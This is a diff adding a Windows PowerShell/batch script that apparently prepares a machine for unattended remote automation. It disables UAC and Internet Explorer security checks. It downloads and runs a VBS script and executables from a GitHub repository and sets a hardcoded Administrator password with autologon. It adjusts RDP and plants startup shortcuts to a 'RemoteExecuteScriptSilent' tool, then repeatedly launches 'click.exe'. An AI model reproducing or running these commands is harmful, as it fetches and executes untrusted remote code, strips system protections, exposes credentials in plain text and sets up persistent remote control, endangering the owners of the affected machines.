@@ -1,0 +1,61 @@
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\Security" /V "DisableSecuritySettingsCheck" /T "REG_DWORD" /D "00000001" /F
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" /V "1806" /T "REG_DWORD" /D "00000000" /F
+REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" /V "1806" /T "REG_DWORD" /D "00000000" /F
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+$LocalTempDir = $env:TEMP; $ChromeInstaller = "ChromeInstaller.exe"; (new-object    System.Net.WebClient).DownloadFile('http://dl.google.com/chrome/install/375.126/chrome_installer.exe', "$LocalTempDir\$ChromeInstaller"); & "$LocalTempDir\$ChromeInstaller" /silent /install; $Process2Monitor =  "ChromeInstaller"; Do { $ProcessesFound = Get-Process | ?{$Process2Monitor -contains $_.Name} | Select-Object -ExpandProperty Name; If ($ProcessesFound) { "Still running: $($ProcessesFound -join ', ')" | Write-Host; Start-Sleep -Seconds 2 } else { rm "$LocalTempDir\$ChromeInstaller" -ErrorAction SilentlyContinue -Verbose } } Until (!$ProcessesFound)
+sleep 2;
+[system.Diagnostics.Process]::Start("chrome","https://github.com/jokermakelove/unzip/raw/main/Chrome.57.zip");[system.Diagnostics.Process]::Start("chrome","https://github.com/jokermakelove/unzip/raw/main/click.exe");net user Administrator Nancyhd1@;
+sleep 10;
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$url = "https://raw.githubusercontent.com/jokermakelove/unzip/main/a.vbs";$response = Invoke-WebRequest -Uri $url;$code = $response.Content;$filepath = "C:\temp\a.vbs";Set-Content -Path $filepath -Value $code;Start-Process -FilePath $filepath;
+sleep 10;
+Set-ExecutionPolicy RemoteSigned -Force
+$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+$DefaultUsername = "Administrator"
+$DefaultPassword = "Nancyhd1@"
+Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
+Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
+Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
+Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 3389
+New-Item -Path 'C:\temp' -ItemType Directory
+$env:userdomain
+C:\Users\Administrator\Downloads\Autologon64 Administrator $env:userdomain Nancyhd1@
+$SourceFilePath = "C:\Users\Administrator\Downloads\RemoteExecuteScriptSilent.exe"
+$ShortcutPath = "C:\Users\Administrator\Start Menu\Programs\Startup\RemoteExecuteScriptSilent.lnk"
+$WScriptObj = New-Object -ComObject ("WScript.Shell")
+$shortcut = $WscriptObj.CreateShortcut($ShortcutPath)
+$shortcut.TargetPath = $SourceFilePath
+$shortcut.WindowStyle = 1
+$ShortCut.Hotkey = "F1"; $shortcut.Save()
+$SourceFilePath = "C:\Users\Administrator\Downloads\RemoteExecuteScriptSilent.exe"
+$ShortcutPath = "C:\Users\Administrator\Desktop\RemoteExecuteScriptSilent.lnk"
+$WScriptObj = New-Object -ComObject ("WScript.Shell")
+$shortcut = $WscriptObj.CreateShortcut($ShortcutPath)
+$shortcut.TargetPath = $SourceFilePath
+$shortcut.WindowStyle = 1
+$ShortCut.Hotkey = "F1"; $shortcut.Save()
+$ShortCut.Hotkey = "F1"; $shortcut.Save()
+$SourceFilePath = "C:\Users\Administrator\Chrome.57\Shutdown.exe"
+$ShortcutPath = "C:\Users\Administrator\Desktop\Shutdown.lnk"
+$WScriptObj = New-Object -ComObject ("WScript.Shell")
+$shortcut = $WscriptObj.CreateShortcut($ShortcutPath)
+$shortcut.TargetPath = $SourceFilePath
+$shortcut.WindowStyle = 1
+$ShortCut.Hotkey = "F1"; $shortcut.Save()
+taskkill /f /im FastExecuteScript.exe
+Start "C:\Users\Administrator\Downloads\Shutdown.exe";sleep 50;Start "C:\Users\Administrator\Downloads\click.exe";;sleep 50;Start "C:\Users\Administrator\Downloads\click.exe";;sleep 50;Start "C:\Users\Administrator\Downloads\click.exe";;sleep 50;Start "C:\Users\Administrator\Downloads\click.exe";
+
+Start "C:\Users\Administrator\Downloads\click.exe"
+sleep 30
+Start "C:\Users\Administrator\Downloads\click.exe"
+sleep 30
+Start "C:\Users\Administrator\Downloads\click.exe"
+sleep 30
+Start "C:\Users\Administrator\Downloads\click.exe"
+sleep 30
+Start "C:\Users\Administrator\Downloads\click.exe"
+sleep 30
+Start "C:\Users\Administrator\Downloads\click.exe"
+sleep 30
+Start "C:\Users\Administrator\Downloads\click.exe"
+sleep 30
+Start "C:\Users\Administrator\Downloads\click.exe"
